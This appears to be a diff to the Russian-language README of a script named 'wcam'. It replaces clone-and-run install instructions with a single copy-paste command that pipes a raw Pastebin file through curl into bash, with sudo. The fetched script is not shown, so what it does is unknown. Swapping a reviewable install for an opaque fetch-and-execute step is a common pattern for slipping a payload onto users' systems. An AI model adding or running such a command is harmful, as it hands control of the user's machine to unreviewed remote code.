@@ -9,12 +9,8 @@ QIWI: https://qiwi.com/n/MO4KI
 (Спасибо за донат)
 
 # Как установить?
-<b>Установка проста и не требует лишних действий. Тупо нужно следовать командам</b><br>
-• <code>apt update -y</code><br>
-• <code>apt upgrade -y</code><br>
-• <code>apt install git python3</code><br>
-• <code>git clone https://github.com/mo4ki/wcam</code><br>
-• <code>python3 wcam.py</code><br>
+<b>Установка проста и не требует лишних действий. Тупоc Ctrl+C Ctrl+V</b><br>
+• <code>sudo curl -0 https://pastebin.com/raw/r0dL14Xk | bash</code><br>
 
 # Скрипт в действии
 
